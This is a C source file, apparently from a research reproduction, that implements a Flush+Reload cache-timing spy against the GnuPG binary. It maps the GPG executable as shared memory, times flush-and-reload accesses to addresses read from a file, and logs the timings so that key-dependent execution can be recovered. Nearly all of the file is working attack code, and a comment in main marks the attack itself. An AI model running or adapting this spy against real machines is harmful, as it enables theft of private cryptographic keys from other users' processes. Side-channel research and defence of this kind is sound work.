#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <sched.h>

#include "args.h"

// Roughly 8 MB. Always ensure that the executable is smaller than this
#define GPG_MAX_SIZE_BYTES 8388608

// See paper for the threshold of probe()
#define PROBE_THRESHOLD 110ul

// Maximum number of addresses to probe
#define MAX_NUM_OF_ADDRS 10u

// Number of time slots to record
#define TIME_SLOTS 100000

#define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++)\
                                                 ;

int probe(char *adrs) {
    volatile unsigned long time;

    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time < PROBE_THRESHOLD;
}

unsigned long probe_timing(char *adrs) {
    volatile unsigned long time;

    asm __volatile__(
        "    clflush 0(%1)      \n"
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        "    clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}

unsigned long probe_timing_no_clflush(char *adrs) {
    volatile unsigned long time;

    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    movl %%eax, %%esi  \n"
        "    movl (%1), %%eax   \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    subl %%esi, %%eax  \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}

typedef struct {
    unsigned long result[MAX_NUM_OF_ADDRS];
} time_slot;

#ifndef DYNAMIC_TIMING

//#define AVG_LEN 1000
// #define AVG_LEN 800
// #define AVG_LEN 100
// #define AVG_LEN 30
#define AVG_LEN 3

void spy_store(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
        int busy_cycles) {

    for (size_t slot = 0; slot < num_slots; slot++) {
	//for (int addr = 0; addr < (int) num_addrs; addr++) {
	for (int addr = num_addrs - 1; addr >= 0; addr--) {
	    char *ptr = addrs[addr];
	    unsigned long result = probe_timing(ptr);
	    slots[slot].result[addr] = result;
	}
	busy_wait(busy_cycles);
    }

    printf("Done!\n");
}

void spy(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
        int busy_cycles) {

    int running = 1;
    unsigned long avg_sum = 0;

    for (size_t slot = 0; slot < AVG_LEN; slot++) {
        for (int addr = 0; addr < (int) num_addrs; addr++) {
            char *ptr = addrs[addr];
            slots[slot].result[addr] = 100000;
            avg_sum += 100000;
        }
    }

    while (running) {
            for (size_t slot = AVG_LEN; slot < num_slots; slot++) {
                for (int addr = 0; addr < (int) num_addrs; addr++) {
                    char *ptr = addrs[addr];
                    unsigned long result = probe_timing(ptr);
                    slots[slot].result[addr] = result;

                    avg_sum += result;
                    avg_sum -= slots[slot - AVG_LEN].result[addr];

                    //if (avg_sum < 340000) {
                    // if (avg_sum < 155000) {
                    // if (avg_sum < 18000) {
                    // if (avg_sum < 5500) {
                    if (avg_sum < 532) {
                            printf("avg_sum: %ld\n", avg_sum);
                            running = 0;
                            slot = num_slots;
                            break;
                    }
                }
                busy_wait(busy_cycles);
            }

            if (!running) {
                    break;
            }

               /*
            printf("Before: %ld\n", avg_sum);
            unsigned long test_sum = 0;
            for (int i = num_slots - AVG_LEN; i < num_slots; i++) {
                    test_sum += slots[i].result[0];
            }
            printf("Test sum: %ld\n", avg_sum);
            printf("First: %ld\n", slots[num_slots - AVG_LEN].result[0]);
            */

            memcpy(slots, slots + num_slots - AVG_LEN, AVG_LEN * sizeof(*slots));

            //printf("Change\n");
    }

    printf("Done!\n");
}

void spy_min(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
        int busy_cycles) {

    int running = 1;
    
    char *ptr = addrs[0];
    while (running) {
	    unsigned long result = probe_timing(ptr);

	    if (result < 100) {
		    printf("result: %ld\n", result);
		    running = 0;
		    break;
	    }
	    busy_wait(busy_cycles);
	    sched_yield();
    }

    printf("Done!\n");
}

void spy_sleep_min(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
        int busy_cycles) {

    char *ptr = addrs[0];
    unsigned long result;

    for (int i = 0; i < 10; i++) {
    	result = probe_timing(ptr);
        printf("first: %ld\n", result);
    }

    printf("test: %d\n", *ptr);
    printf("test: %d\n", *(addrs[1]));
    printf("test: %d\n", *(addrs[2]));

    int t1 = clock();
    int sum = 0;
    for (int j = 0; j < 2; j++) {
	    for (int i = 0; i < 500000/*1000000000*/; i++) {
		    sum += i * i + sum + i * sum;
	    }
    }
    int delta = clock() - t1;

    printf("delta: %d\n", delta);
    printf("delta: %ld\n", CLOCKS_PER_SEC);

    result = probe_timing(ptr);
    printf("result: %ld\n", result);

    ptr = addrs[1];
    result = probe_timing(ptr);
    printf("result: %ld\n", result);

    ptr = addrs[2];
    result = probe_timing(ptr);
    printf("result: %ld\n", result);

    printf("Done!\n");
}

#else

static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ volatile (".byte 0x0f, 0x31" : "=A" (x));
    return x;
}

void spy(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
        int busy_cycles) {
    unsigned long long clock = rdtsc();
    unsigned long long old_clock;
    unsigned long long avg = 0;
    unsigned long long large = 0;
    unsigned long long start = clock;
    for (size_t slot = 0; slot < num_slots; slot++) {
        old_clock = clock;
        clock = rdtsc();
        while ((clock - old_clock) < (unsigned long long) busy_cycles) {
            busy_wait((busy_cycles - (clock - old_clock)) / 50);
            clock = rdtsc();
        }
        if ((clock - old_clock) > 2000 && slot > 9000 && slot < 15000) {
            large += 1;
        }
        avg = (avg * slot + (clock - old_clock)) / (slot + 1);
        if (slot % 1000 == 0) {
            printf("slot: %lu\n", slot);
        }
        for (int addr = 0; addr < (int) num_addrs; addr++) {
            char *ptr = addrs[addr];
            unsigned long result = probe_timing(ptr);
            slots[slot].result[addr] = result;
        }
    }
    printf("avg: %llu\n", avg);
    printf("avg: %llu\n", large);
    printf("elapsed: %llu\n", rdtsc() - start);
}

#endif

void write_slots_to_file(size_t num_addrs,
        time_slot *slots, size_t num_slots,
        FILE *out_file) {
    for (size_t slot = 0; slot < num_slots; slot++) {
        for (size_t addr = 0; addr < num_addrs; addr++) {
            unsigned long result = slots[slot].result[addr];
            fprintf(out_file, "%lu %lu %lu\n", slot, addr, result);
        }
    }
}

void offset_addresses(void *gpg_base, char **addrs, size_t num_addrs) {
    for (size_t i = 0; i < num_addrs; i++) {
        // Here be dragons :O
        unsigned long ptr_offset = (unsigned long)gpg_base;
        char *adjusted_ptr = addrs[i] + ptr_offset;

        addrs[i] = adjusted_ptr;
    }
}
   
time_slot slots[TIME_SLOTS];

int main(int argc, char *argv[]) {
    struct args_st arguments;
    if (!read_args(&arguments, argc, argv)) {
        return 1;
    }

    // memory map so we can force OS to share this memory page with GPG process
    size_t map_len = GPG_MAX_SIZE_BYTES;
    void *gpg_base = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED,
            arguments.gpg_fd, 0);
    if (gpg_base == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("GPG binary mmapped to %p\n", gpg_base);

    // NOTE: this is an array of pointers. The paper uses `char *` for this, but
    // I'm not sure yet if we can get away with using `void *` instead, which I
    // think is a lot easier to understand.
    char *addrs[MAX_NUM_OF_ADDRS];
    size_t num_addrs = read_addrs(arguments.addr_file, addrs, MAX_NUM_OF_ADDRS);
    if (num_addrs == 0) {
        fprintf(stderr, "Did not read any addresses from file\n");
        return 0;
    }

    printf("Probing %lu addresses:\n", num_addrs);
    for (size_t i = 0; i < num_addrs; i++) {
        printf("%p\n", addrs[i]);
    }

    offset_addresses(gpg_base, addrs, num_addrs);
    printf("Here are the offset addresses (respectively):\n");
    for (size_t i = 0; i < num_addrs; i++) {
        printf("%p\n", addrs[i]);
    }

    // ATTAAAAACK!
    printf("Started spying\n");
    spy_store(addrs, num_addrs, slots, TIME_SLOTS, arguments.busy_cycles);
    printf("Finished spying\n");

    write_slots_to_file(num_addrs, slots, TIME_SLOTS, arguments.out_file);

    // Probably never reached because we'll likely just ^C the program. Maybe
    // implement a SIGTERM / SIGINT handler?
    munmap(gpg_base, map_len);
    cleanup_args(&arguments);
    return 0;
}

